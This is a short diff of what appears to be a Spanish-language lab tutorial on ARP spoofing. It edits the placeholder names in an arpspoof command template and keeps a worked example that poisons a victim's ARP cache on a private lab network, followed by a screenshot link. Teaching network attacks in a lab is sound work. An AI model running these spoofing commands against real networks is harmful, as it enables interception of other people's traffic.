@@ -80,7 +80,7 @@ DST/MASK       DEV     METRIC GATEWAY
 0.0.0.0/0      enp0s3  100    10.0.2.1
 ::1/128        lo      0
 ::1/128        lo      256
-sudo arpspoof -i [interfazAtancante] -t [víctima] [puerta de enlace]
+sudo arpspoof -i [interfazAtancante] -t [ipVíctima] [ipPuertaEnlace]
 sudo arpspoof -i enp0s3 -t 10.10.10.5 10.10.10.1
 ```
 ![](capturas/arp-spoof-attack.png)
